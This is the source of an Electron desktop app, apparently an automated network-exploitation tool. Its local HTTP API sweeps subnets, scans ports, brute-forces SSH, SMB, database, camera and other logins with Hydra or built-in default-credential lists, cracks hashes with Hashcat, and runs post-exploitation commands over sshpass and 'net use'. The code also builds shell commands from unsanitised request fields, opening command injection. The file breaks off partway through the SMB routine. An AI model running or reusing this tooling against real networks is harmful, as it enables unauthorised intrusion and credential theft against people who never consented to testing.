const { app, BrowserWindow, Menu, shell, dialog, ipcMain } = require('electron');
const path = require('path');
const http = require('http');
const fs = require('fs');
const { exec, spawn } = require('child_process');
const net = require('net');
const os = require('os');
const crypto = require('crypto');

let mainWindow;
let httpServer;
const isDev = process.env.NODE_ENV === 'development';

// Handle NSIS installer events (install/uninstall/update) - quit immediately
if (process.platform === 'win32') {
    const cmd = process.argv[1];
    if (cmd === '--squirrel-install' || cmd === '--squirrel-updated' ||
        cmd === '--squirrel-uninstall' || cmd === '--squirrel-obsolete') {
        app.quit();
    }
}

// Enforce single instance - prevent app from opening multiple times
const gotTheLock = app.requestSingleInstanceLock();
if (!gotTheLock) {
    app.quit();
} else {
    app.on('second-instance', () => {
        if (mainWindow) {
            if (mainWindow.isMinimized()) mainWindow.restore();
            mainWindow.focus();
        }
    });
}

// Find an available port starting from the given one
function findAvailablePort(startPort) {
    return new Promise((resolve) => {
        const server = net.createServer();
        server.listen(startPort, '127.0.0.1', () => {
            const port = server.address().port;
            server.close(() => resolve(port));
        });
        server.on('error', () => {
            resolve(findAvailablePort(startPort + 1));
        });
    });
}

// Get app data directory for persistent storage
function getAppDataPath() {
    const appData = app.getPath('userData');
    if (!fs.existsSync(appData)) {
        fs.mkdirSync(appData, { recursive: true });
    }
    return appData;
}

function getUsersFilePath() {
    return path.join(getAppDataPath(), 'users.json');
}

function getUsers() {
    const filePath = getUsersFilePath();
    if (!fs.existsSync(filePath)) return {};
    try {
        return JSON.parse(fs.readFileSync(filePath, 'utf8'));
    } catch { return {}; }
}

function saveUsers(users) {
    fs.writeFileSync(getUsersFilePath(), JSON.stringify(users, null, 2));
}

function hashPassword(password) {
    return crypto.createHash('sha256').update(password).digest('hex');
}

// MIME types for static file serving
const MIME_TYPES = {
    '.html': 'text/html',
    '.js': 'application/javascript',
    '.css': 'text/css',
    '.json': 'application/json',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.gif': 'image/gif',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon',
    '.woff': 'font/woff',
    '.woff2': 'font/woff2',
    '.ttf': 'font/ttf',
    '.txt': 'text/plain',
    '.map': 'application/json'
};

// Get the path to the static export directory
function getStaticDir() {
    if (app.isPackaged) {
        return path.join(process.resourcesPath, 'out');
    }
    return path.join(__dirname, '..', 'out');
}

// Combined server: API endpoints + static file serving
function createAppServer() {
    return http.createServer((req, res) => {
        const urlPath = req.url.split('?')[0];

        // Handle API requests
        if (urlPath.startsWith('/api/')) {
            let body = '';
            req.on('data', chunk => body += chunk);
            req.on('end', () => {
                res.setHeader('Access-Control-Allow-Origin', '*');
                res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
                res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
                res.setHeader('Content-Type', 'application/json');

                if (req.method === 'OPTIONS') {
                    res.writeHead(200);
                    return res.end();
                }

                try {
                    handleApiRequest(urlPath, req.method, body, res);
                } catch (err) {
                    res.writeHead(500);
                    res.end(JSON.stringify({ error: err.message }));
                }
            });
            return;
        }

        // Handle CORS preflight for any route
        if (req.method === 'OPTIONS') {
            res.setHeader('Access-Control-Allow-Origin', '*');
            res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
            res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
            res.writeHead(200);
            return res.end();
        }

        // Serve static files from the Next.js export
        serveStaticFile(urlPath, res);
    });
}

function handleApiRequest(urlPath, method, body, res) {
    // Registration check
    if (urlPath === '/api/registration-status' && method === 'GET') {
        const users = getUsers();
        res.writeHead(200);
        return res.end(JSON.stringify({ registration_needed: Object.keys(users).length === 0 }));
    }

    // Register
    if (urlPath === '/api/register' && method === 'POST') {
        const data = JSON.parse(body);
        const users = getUsers();
        if (users[data.username]) {
            res.writeHead(400);
            return res.end(JSON.stringify({ error: 'User already exists' }));
        }
        users[data.username] = {
            password: hashPassword(data.password),
            createdAt: new Date().toISOString()
        };
        saveUsers(users);
        const token = crypto.randomBytes(32).toString('hex');
        res.writeHead(200);
        return res.end(JSON.stringify({
            user: { name: data.username },
            token: token,
            token_expiration_time: Date.now() + 86400000
        }));
    }

    // Login
    if (urlPath === '/api/login' && method === 'POST') {
        const data = JSON.parse(body);
        const users = getUsers();
        const user = users[data.username];
        if (!user || user.password !== hashPassword(data.password)) {
            res.writeHead(401);
            return res.end(JSON.stringify({ error: 'Invalid credentials' }));
        }
        const token = crypto.randomBytes(32).toString('hex');
        res.writeHead(200);
        return res.end(JSON.stringify({
            user: { name: data.username },
            token: token,
            token_expiration_time: Date.now() + 86400000
        }));
    }

    // Network scan (real ping sweep)
    if (urlPath === '/api/scan-network' && method === 'POST') {
        const data = JSON.parse(body);
        const subnet = data.subnet || getLocalSubnet();
        performNetworkScan(subnet, (results) => {
            res.writeHead(200);
            res.end(JSON.stringify({ hosts: results, subnet: subnet }));
        });
        return;
    }

    // Port scan (real)
    if (urlPath === '/api/scan-ports' && method === 'POST') {
        const data = JSON.parse(body);
        performPortScan(data.host, data.ports || [22, 80, 443, 445, 3389, 8080, 8443], (results) => {
            res.writeHead(200);
            res.end(JSON.stringify({ host: data.host, ports: results }));
        });
        return;
    }

    // Network info
    if (urlPath === '/api/network-info' && method === 'GET') {
        res.writeHead(200);
        return res.end(JSON.stringify(getNetworkInfo()));
    }

    // System info
    if (urlPath === '/api/system-info' && method === 'GET') {
        res.writeHead(200);
        return res.end(JSON.stringify({
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            cpus: os.cpus().length,
            totalMemory: os.totalmem(),
            freeMemory: os.freemem(),
            uptime: os.uptime(),
            networkInterfaces: getNetworkInfo().interfaces,
            version: '2.5.0'
        }));
    }

    // SSH exploitation attempt (real TCP connection test)
    if (urlPath === '/api/exploit-ssh' && method === 'POST') {
        const data = JSON.parse(body);
        attemptSSHExploit(data.host, data.username, data.password, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // SMB exploitation attempt (real TCP connection test)
    if (urlPath === '/api/exploit-smb' && method === 'POST') {
        const data = JSON.parse(body);
        attemptSMBExploit(data.host, data.username, data.password, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Post-exploitation data collection
    if (urlPath === '/api/post-exploit' && method === 'POST') {
        const data = JSON.parse(body);
        collectPostExploitData(data.host, data.method, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Service banner grabbing
    if (urlPath === '/api/grab-banner' && method === 'POST') {
        const data = JSON.parse(body);
        grabServiceBanner(data.host, data.port, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // OS fingerprinting
    if (urlPath === '/api/fingerprint-os' && method === 'POST') {
        const data = JSON.parse(body);
        fingerprintOS(data.host, data.openPorts || [], (os) => {
            res.writeHead(200);
            res.end(JSON.stringify({ host: data.host, os }));
        });
        return;
    }

    // Get MITRE ATT&CK technique library
    if (urlPath === '/api/attack-techniques' && method === 'GET') {
        res.writeHead(200);
        res.end(JSON.stringify(ATTACK_TECHNIQUES));
        return;
    }

    // Map exploit method to ATT&CK techniques
    if (urlPath === '/api/attack-mapping' && method === 'POST') {
        const data = JSON.parse(body);
        const mapping = mapExploitToATTACK(data.method || '');
        res.writeHead(200);
        res.end(JSON.stringify(mapping));
        return;
    }

    // Post-exploitation discovery (Caldera-style abilities)
    if (urlPath === '/api/post-exploit-discovery' && method === 'POST') {
        const data = JSON.parse(body);
        executeDiscoveryAbilities(data.host, data.method || 'SSH', data.credentials || {}, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Smart Post-Exploitation Agent
    if (urlPath === '/api/post-exploit-agent' && method === 'POST') {
        const data = JSON.parse(body);
        postExploitAgent(data.host, data.method || 'SSH', data.credentials || {}, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Test credentials against a specific host/service
    if (urlPath === '/api/test-credentials' && method === 'POST') {
        const data = JSON.parse(body);
        testCredentials(data.host, data.port || 22, data.service || 'ssh', data.username || 'admin', data.password || 'admin', (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Batch test credentials against a host/service
    if (urlPath === '/api/batch-test-credentials' && method === 'POST') {
        const data = JSON.parse(body);
        const creds = data.credentials || [{ username: 'admin', password: 'admin' }];
        batchTestCredentials(data.host, data.port || 22, data.service || 'ssh', creds, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Parallel fast credential testing (concurrent connections)
    if (urlPath === '/api/parallel-test-credentials' && method === 'POST') {
        const data = JSON.parse(body);
        const deviceType = data.deviceType || 'Unknown';
        const brand = data.brand || null;
        const userCreds = data.credentials || [];
        const builtinCreds = getCredentialsForDevice(deviceType, brand);
        const allCreds = [...userCreds, ...builtinCreds];
        const uniqueCreds = [];
        const seen = new Set();
        for (const c of allCreds) {
            const key = `${c.username}:${c.password}`;
            if (!seen.has(key)) { seen.add(key); uniqueCreds.push(c); }
        }
        const concurrency = data.concurrency || 8;
        parallelTestCredentials(data.host, data.port || 22, data.service || 'ssh', uniqueCreds, concurrency, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Camera scan (identify brand, test creds, find RTSP streams)
    if (urlPath === '/api/scan-camera' && method === 'POST') {
        const data = JSON.parse(body);
        scanCamera(data.host, data.openPorts || [80, 554], (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Get credential database
    if (urlPath === '/api/credential-db' && method === 'GET') {
        res.writeHead(200);
        res.end(JSON.stringify({
            categories: Object.keys(CREDENTIAL_DB),
            counts: Object.fromEntries(Object.entries(CREDENTIAL_DB).map(([k, v]) => [k, v.length])),
            total: Object.values(CREDENTIAL_DB).reduce((sum, arr) => sum + arr.length, 0)
        }));
        return;
    }

    // Get camera architectures
    if (urlPath === '/api/camera-architectures' && method === 'GET') {
        res.writeHead(200);
        res.end(JSON.stringify(CAMERA_ARCHITECTURES));
        return;
    }

    // Run THC Hydra brute-force
    if (urlPath === '/api/hydra-attack' && method === 'POST') {
        const data = JSON.parse(body);
        const users = data.usernames || ['admin', 'root'];
        const passwords = data.passwords || [];
        const deviceType = data.deviceType || 'Unknown';
        const builtinCreds = getCredentialsForDevice(deviceType, data.brand);
        const allPasswords = [...new Set([...passwords, ...builtinCreds.map(c => c.password)])];
        const allUsers = [...new Set([...users, ...builtinCreds.map(c => c.username)])];
        runHydra(data.host, data.port, data.service || 'ssh', allUsers, allPasswords, {
            tasks: data.tasks || 16, timeout: data.timeout || 30
        }, (result) => {
            if (result.fallback) {
                // Hydra not installed, use built-in parallel tester
                const creds = [];
                for (const u of allUsers) { for (const p of allPasswords) { creds.push({ username: u, password: p }); } }
                parallelTestCredentials(data.host, data.port || 22, data.service || 'ssh', creds.slice(0, 500), 10, (fallbackResult) => {
                    fallbackResult.tool = 'built-in-parallel';
                    res.writeHead(200);
                    res.end(JSON.stringify(fallbackResult));
                });
            } else {
                result.tool = 'thc-hydra';
                res.writeHead(200);
                res.end(JSON.stringify(result));
            }
        });
        return;
    }

    // Run Hashcat GPU cracking
    if (urlPath === '/api/hashcat-crack' && method === 'POST') {
        const data = JSON.parse(body);
        const isWin = process.platform === 'win32';
        const tmpDir = isWin ? process.env.TEMP || 'C:\\Temp' : '/tmp';
        const hashFile = path.join(tmpDir, `hashes_${Date.now()}.txt`);
        const wordlistFile = path.join(tmpDir, `wordlist_${Date.now()}.txt`);

        fs.writeFileSync(hashFile, (data.hashes || []).join('\n'));
        const builtinCreds = getCredentialsForDevice(data.deviceType || 'Unknown');
        const allPasswords = [...new Set([...(data.passwords || []), ...builtinCreds.map(c => c.password)])];
        fs.writeFileSync(wordlistFile, allPasswords.join('\n'));

        runHashcat(hashFile, data.hashType || 0, wordlistFile, {
            gpuOnly: data.gpuOnly || false, force: data.force || true
        }, (result) => {
            try { fs.unlinkSync(hashFile); } catch(e) {}
            try { fs.unlinkSync(wordlistFile); } catch(e) {}
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Sliver-inspired post-exploitation agent
    if (urlPath === '/api/sliver-agent' && method === 'POST') {
        const data = JSON.parse(body);
        sliverInspiredAgent(data.host, data.method || 'SSH', data.credentials || {}, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Enhanced vulnerability scanner
    if (urlPath === '/api/vuln-scan' && method === 'POST') {
        const data = JSON.parse(body);
        enhancedVulnScan(data.host, data.openPorts || [80, 443, 22], (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Detect installed security tools
    if (urlPath === '/api/detect-tools' && method === 'GET') {
        const toolResults = {};
        let pending = 4;
        function toolDone() {
            pending--;
            if (pending <= 0) { res.writeHead(200); res.end(JSON.stringify(toolResults)); }
        }
        detectHydra((found, path) => { toolResults.hydra = { installed: found, path }; toolDone(); });
        detectHashcat((found, path, version) => { toolResults.hashcat = { installed: found, path, version }; toolDone(); });
        detectInstalledTools((tools) => { toolResults.other = tools; toolDone(); });
        exec('nmap --version 2>/dev/null', { timeout: 5000 }, (err, stdout) => {
            toolResults.nmap = { installed: !!stdout, version: stdout ? stdout.split('\n')[0] : null };
            toolDone();
        });
        return;
    }

    // Test RTSP stream
    if (urlPath === '/api/test-rtsp' && method === 'POST') {
        const data = JSON.parse(body);
        testRTSPAccess(data.host, data.port || 554, data.path || '/stream1', data.username || '', data.password || '', (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Network scan a specific subnet
    if (urlPath === '/api/scan-subnet' && method === 'POST') {
        const data = JSON.parse(body);
        const subnet = data.subnet; // e.g., "192.168.1"
        if (!subnet) {
            res.writeHead(400);
            res.end(JSON.stringify({ error: 'Subnet required (e.g., 192.168.1)' }));
            return;
        }
        const startIp = data.startIp || 1;
        const endIp = data.endIp || 254;
        const hosts = [];
        let scanned = 0;
        const total = endIp - startIp + 1;

        function scanNext(i) {
            if (i > endIp) {
                res.writeHead(200);
                res.end(JSON.stringify({ subnet, hosts, total: hosts.length, scanned }));
                return;
            }
            const ip = `${subnet}.${i}`;
            pingHost(ip, (alive) => {
                scanned++;
                if (alive) {
                    scanPortsBatch(ip, [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 554, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888, 27017], (openPorts) => {
                        fingerprintOS(ip, openPorts, (osInfo) => {
                            const deviceType = identifyDeviceType(openPorts, osInfo);
                            hosts.push({
                                ip, alive: true, openPorts,
                                os: osInfo, deviceType,
                                services: openPorts.map(p => getServiceName(p))
                            });
                            scanNext(i + 1);
                        });
                    });
                } else {
                    scanNext(i + 1);
                }
            });
        }

        // Process 5 IPs concurrently for speed
        let concurrent = 0;
        const maxConcurrent = 5;
        let nextIp = startIp;
        const allDone = [];

        function processIp(i) {
            const ip = `${subnet}.${i}`;
            pingHost(ip, (alive) => {
                scanned++;
                if (alive) {
                    scanPortsBatch(ip, [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 554, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888, 27017], (openPorts) => {
                        fingerprintOS(ip, openPorts, (osInfo) => {
                            const deviceType = identifyDeviceType(openPorts, osInfo);
                            hosts.push({
                                ip, alive: true, openPorts,
                                os: osInfo, deviceType,
                                services: openPorts.map(p => getServiceName(p))
                            });
                            concurrent--;
                            launchNext();
                        });
                    });
                } else {
                    concurrent--;
                    launchNext();
                }
            });
        }

        function launchNext() {
            while (concurrent < maxConcurrent && nextIp <= endIp) {
                concurrent++;
                processIp(nextIp++);
            }
            if (concurrent === 0 && nextIp > endIp) {
                res.writeHead(200);
                res.end(JSON.stringify({ subnet, hosts, total: hosts.length, scanned }));
            }
        }

        launchNext();
        return;
    }

    // Detect installed exploitation tools
    if (urlPath === '/api/detect-tools' && method === 'GET') {
        detectInstalledTools((tools) => {
            res.writeHead(200);
            res.end(JSON.stringify({ tools, count: Object.keys(tools).length }));
        });
        return;
    }

    // Nmap vulnerability scan
    if (urlPath === '/api/nmap-scan' && method === 'POST') {
        const data = JSON.parse(body);
        nmapVulnScan(data.host, data.openPorts || [], (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // NetExec multi-protocol exploit
    if (urlPath === '/api/exploit-nxc' && method === 'POST') {
        const data = JSON.parse(body);
        nxcFullExploit(data.host, data.openPorts || [], data.credentials || [], (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Impacket exploit
    if (urlPath === '/api/exploit-impacket' && method === 'POST') {
        const data = JSON.parse(body);
        impacketFullExploit(data.host, data.credentials || [], (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Hydra brute-force
    if (urlPath === '/api/exploit-hydra' && method === 'POST') {
        const data = JSON.parse(body);
        hydraBrute(data.host, data.port, data.service, data.credentials || [], (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Full auto-exploit: tries all methods against a host
    if (urlPath === '/api/auto-exploit' && method === 'POST') {
        const data = JSON.parse(body);
        autoExploit(data.host, data.openPorts || [], data.credentials || [], (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // FTP exploitation
    if (urlPath === '/api/exploit-ftp' && method === 'POST') {
        const data = JSON.parse(body);
        attemptFTPExploit(data.host, data.username, data.password, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Telnet exploitation
    if (urlPath === '/api/exploit-telnet' && method === 'POST') {
        const data = JSON.parse(body);
        attemptTelnetExploit(data.host, data.username, data.password, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Redis no-auth exploitation
    if (urlPath === '/api/exploit-redis' && method === 'POST') {
        const data = JSON.parse(body);
        attemptRedisExploit(data.host, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // MongoDB no-auth exploitation
    if (urlPath === '/api/exploit-mongodb' && method === 'POST') {
        const data = JSON.parse(body);
        attemptMongoExploit(data.host, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // MySQL exploitation
    if (urlPath === '/api/exploit-mysql' && method === 'POST') {
        const data = JSON.parse(body);
        attemptMySQLExploit(data.host, data.username, data.password, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // PostgreSQL exploitation
    if (urlPath === '/api/exploit-postgres' && method === 'POST') {
        const data = JSON.parse(body);
        attemptPostgresExploit(data.host, data.username, data.password, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // VNC no-auth check
    if (urlPath === '/api/exploit-vnc' && method === 'POST') {
        const data = JSON.parse(body);
        attemptVNCExploit(data.host, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ error: 'Not found' }));
}

function serveStaticFile(urlPath, res) {
    const staticDir = getStaticDir();

    // Try to find the file
    let filePath;
    const decodedPath = decodeURIComponent(urlPath);

    if (decodedPath === '/') {
        filePath = path.join(staticDir, 'index.html');
    } else {
        // First try exact file path
        filePath = path.join(staticDir, decodedPath);
    }

    // Security: prevent path traversal
    if (!filePath.startsWith(staticDir)) {
        res.writeHead(403);
        return res.end('Forbidden');
    }

    // Try the exact path, then with index.html, then with .html
    const candidates = [
        filePath,
        path.join(filePath, 'index.html'),
        filePath + '.html',
        filePath.replace(/\/$/, '') + '/index.html'
    ];

    for (const candidate of candidates) {
        if (fs.existsSync(candidate) && fs.statSync(candidate).isFile()) {
            const ext = path.extname(candidate).toLowerCase();
            const contentType = MIME_TYPES[ext] || 'application/octet-stream';
            res.setHeader('Content-Type', contentType);
            res.writeHead(200);
            const stream = fs.createReadStream(candidate);
            stream.pipe(res);
            return;
        }
    }

    // Fallback: serve index.html for client-side routing
    const indexPath = path.join(staticDir, 'index.html');
    if (fs.existsSync(indexPath)) {
        res.setHeader('Content-Type', 'text/html');
        res.writeHead(200);
        fs.createReadStream(indexPath).pipe(res);
        return;
    }

    res.writeHead(404);
    res.end('Not found');
}

// Real network scanning functions
function getLocalSubnet() {
    const interfaces = os.networkInterfaces();
    for (const iface of Object.values(interfaces)) {
        for (const addr of iface) {
            if (addr.family === 'IPv4' && !addr.internal) {
                const parts = addr.address.split('.');
                return `${parts[0]}.${parts[1]}.${parts[2]}`;
            }
        }
    }
    return '192.168.1';
}

function getNetworkInfo() {
    const interfaces = os.networkInterfaces();
    const result = { interfaces: [], localIP: '', subnet: '' };
    for (const [name, addrs] of Object.entries(interfaces)) {
        for (const addr of addrs) {
            if (addr.family === 'IPv4') {
                result.interfaces.push({
                    name: name,
                    address: addr.address,
                    netmask: addr.netmask,
                    mac: addr.mac,
                    internal: addr.internal
                });
                if (!addr.internal) {
                    result.localIP = addr.address;
                    const parts = addr.address.split('.');
                    result.subnet = `${parts[0]}.${parts[1]}.${parts[2]}.0/24`;
                }
            }
        }
    }
    return result;
}

function performNetworkScan(subnet, callback) {
    const hosts = [];
    let pending = 0;
    const isWin = process.platform === 'win32';

    for (let i = 1; i <= 254; i++) {
        const ip = `${subnet}.${i}`;
        pending++;

        const pingCmd = isWin
            ? `ping -n 1 -w 500 ${ip}`
            : `ping -c 1 -W 1 ${ip}`;

        exec(pingCmd, { timeout: 2000 }, (error, stdout) => {
            if (!error && stdout) {
                const isAlive = isWin
                    ? !stdout.includes('Request timed out') && !stdout.includes('Destination host unreachable')
                    : stdout.includes('1 received') || stdout.includes('1 packets received');
                if (isAlive) {
                    hosts.push({
                        ip: ip,
                        alive: true,
                        responseTime: extractPingTime(stdout),
                        hostname: '',
                        discoveredAt: new Date().toISOString()
                    });
                }
            }
            pending--;
            if (pending === 0) {
                hosts.sort((a, b) => {
                    const aParts = a.ip.split('.').map(Number);
                    const bParts = b.ip.split('.').map(Number);
                    return aParts[3] - bParts[3];
                });
                callback(hosts);
            }
        });
    }
}

function extractPingTime(output) {
    const match = output.match(/time[=<](\d+\.?\d*)\s*ms/i);
    return match ? parseFloat(match[1]) : 0;
}

function performPortScan(host, ports, callback) {
    const results = [];
    let pending = ports.length;

    const commonServices = {
        21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
        80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS',
        445: 'SMB', 993: 'IMAPS', 995: 'POP3S', 1433: 'MSSQL',
        3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
        6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 27017: 'MongoDB'
    };

    ports.forEach(port => {
        const socket = new net.Socket();
        socket.setTimeout(2000);

        socket.on('connect', () => {
            results.push({
                port: port,
                state: 'open',
                service: commonServices[port] || 'unknown'
            });
            socket.destroy();
            pending--;
            if (pending === 0) callback(results.sort((a, b) => a.port - b.port));
        });

        socket.on('timeout', () => {
            results.push({ port: port, state: 'filtered', service: commonServices[port] || 'unknown' });
            socket.destroy();
            pending--;
            if (pending === 0) callback(results.sort((a, b) => a.port - b.port));
        });

        socket.on('error', () => {
            results.push({ port: port, state: 'closed', service: commonServices[port] || 'unknown' });
            pending--;
            if (pending === 0) callback(results.sort((a, b) => a.port - b.port));
        });

        socket.connect(port, host);
    });
}

// ===== ENHANCED MONKEY EXPLOITATION ENGINE =====

// Service banner grabber - grabs banners from any TCP service
function grabServiceBanner(host, port, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);
    let banner = '';

    socket.on('connect', () => {
        // Some services send banner on connect, others need a probe
        const probes = {
            21: 'USER anonymous\r\n',
            25: 'EHLO monkey\r\n',
            80: 'HEAD / HTTP/1.0\r\nHost: ' + host + '\r\n\r\n',
            110: 'USER test\r\n',
            143: 'a001 CAPABILITY\r\n',
            8080: 'HEAD / HTTP/1.0\r\nHost: ' + host + '\r\n\r\n',
            8443: 'HEAD / HTTP/1.0\r\nHost: ' + host + '\r\n\r\n'
        };

        setTimeout(() => {
            if (probes[port]) {
                socket.write(probes[port]);
            }
        }, 500);
    });

    socket.on('data', (data) => {
        banner += data.toString();
        if (banner.length > 500) {
            socket.destroy();
            callback({ port, banner: banner.substring(0, 500).trim() });
        }
    });

    socket.on('timeout', () => {
        socket.destroy();
        callback({ port, banner: banner.trim() || null });
    });

    socket.on('error', () => {
        callback({ port, banner: null });
    });

    socket.on('close', () => {
        callback({ port, banner: banner.trim() || null });
    });

    socket.connect(port, host);
}

// OS fingerprinting via TCP/IP stack analysis
function fingerprintOS(host, openPorts, callback) {
    let os = 'Unknown';
    const portSet = new Set(openPorts.map(p => p.port));

    // Heuristic-based OS detection
    if (portSet.has(445) || portSet.has(135) || portSet.has(139) || portSet.has(3389)) {
        os = 'Windows';
        if (portSet.has(3389)) os = 'Windows (RDP enabled)';
        if (portSet.has(1433)) os = 'Windows (SQL Server)';
    } else if (portSet.has(22)) {
        os = 'Linux/Unix';
        if (portSet.has(8080) || portSet.has(8443)) os = 'Linux (Web Server)';
        if (portSet.has(3306)) os = 'Linux (MySQL)';
        if (portSet.has(5432)) os = 'Linux (PostgreSQL)';
        if (portSet.has(6379)) os = 'Linux (Redis)';
        if (portSet.has(27017)) os = 'Linux (MongoDB)';
    } else if (portSet.has(80) || portSet.has(443)) {
        os = 'Network Device / Web Server';
    } else if (portSet.has(23)) {
        os = 'Network Device (Telnet)';
    }

    // Try TTL-based OS detection via ping
    const isWin = process.platform === 'win32';
    const pingCmd = isWin ? `ping -n 1 -w 2000 ${host}` : `ping -c 1 -W 2 ${host}`;
    exec(pingCmd, { timeout: 5000 }, (err, stdout) => {
        if (stdout) {
            const ttlMatch = stdout.match(/ttl[=:](\d+)/i);
            if (ttlMatch) {
                const ttl = parseInt(ttlMatch[1]);
                if (ttl <= 64 && ttl > 0) {
                    if (os === 'Unknown') os = 'Linux/Unix (TTL≤64)';
                } else if (ttl <= 128 && ttl > 64) {
                    if (os === 'Unknown') os = 'Windows (TTL≤128)';
                } else if (ttl <= 255 && ttl > 128) {
                    if (os === 'Unknown') os = 'Network Device (TTL≤255)';
                }
            }
        }
        callback(os);
    });
}

// SSH exploitation with real credential testing
function attemptSSHExploit(host, username, password, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);
    let banner = '';
    let dataReceived = false;

    socket.on('connect', () => {
        socket.on('data', (data) => {
            if (dataReceived) return;
            dataReceived = true;
            banner = data.toString().trim();
            socket.destroy();

            const isWin = process.platform === 'win32';
            if (isWin) {
                // Windows: use plink if available, otherwise report banner
                exec(`where plink 2>nul`, { timeout: 2000 }, (err) => {
                    if (!err) {
                        exec(`echo y | plink -ssh -l ${username} -pw ${password} ${host} "echo MONKEY_SUCCESS" 2>&1`, { timeout: 15000 }, (error, stdout) => {
                            callback({
                                success: stdout && stdout.includes('MONKEY_SUCCESS'),
                                method: 'SSH', banner, host, username,
                                info: stdout && stdout.includes('MONKEY_SUCCESS') ? 'Full SSH access gained' : 'Auth failed'
                            });
                        });
                    } else {
                        // Try ssh.exe (Windows 10+)
                        const escapedPass = password.replace(/"/g, '\\"');
                        exec(`echo ${escapedPass} | ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${username}@${host} "echo MONKEY_SUCCESS" 2>&1`, { timeout: 15000 }, (error, stdout) => {
                            callback({
                                success: stdout && stdout.includes('MONKEY_SUCCESS'),
                                method: 'SSH', banner, host, username,
                                info: 'SSH connection attempted via ssh.exe'
                            });
                        });
                    }
                });
            } else {
                // Linux/Mac: try sshpass first, then expect
                exec(`which sshpass 2>/dev/null`, { timeout: 2000 }, (err) => {
                    if (!err) {
                        const escapedPass = password.replace(/'/g, "'\\''");
                        exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=no ${username}@${host} "echo MONKEY_SUCCESS && uname -a && id && hostname" 2>&1`, { timeout: 15000 }, (error, stdout) => {
                            const success = stdout && stdout.includes('MONKEY_SUCCESS');
                            callback({
                                success, method: 'SSH', banner, host, username,
                                info: success ? stdout.replace('MONKEY_SUCCESS', '').trim() : 'Authentication failed',
                                sysInfo: success ? stdout : null
                            });
                        });
                    } else {
                        // Fallback: try without sshpass using expect-like approach
                        exec(`ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o NumberOfPasswordPrompts=0 ${username}@${host} exit 2>&1`, { timeout: 8000 }, (error, stdout) => {
                            const hasKeyAuth = !error;
                            callback({
                                success: hasKeyAuth,
                                method: 'SSH', banner, host, username,
                                info: hasKeyAuth ? 'Key-based auth succeeded' : 'SSH open, install sshpass for credential testing'
                            });
                        });
                    }
                });
            }
        });
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'SSH', error: 'Connection timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'SSH', error: err.message }); });
    socket.connect(22, host);
}

// SMB exploitation with real credential testing
function attemptSMBExploit(host, username, password, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);

    socket.on('connect', () => {
        socket.destroy();
        const isWin = process.platform === 'win32';
        if (isWin) {
            // Windows: use net use for SMB authentication
            exec(`net use \\\\${host}\\IPC$ /user:${username} "${password}" 2>&1`, { timeout: 15000 }, (error, stdout) => {
                const success = !error && !stdout.toLowerCase().includes('error') && !stdout.toLowerCase().includes('denied');
                if (success) {
                    // Get shares list
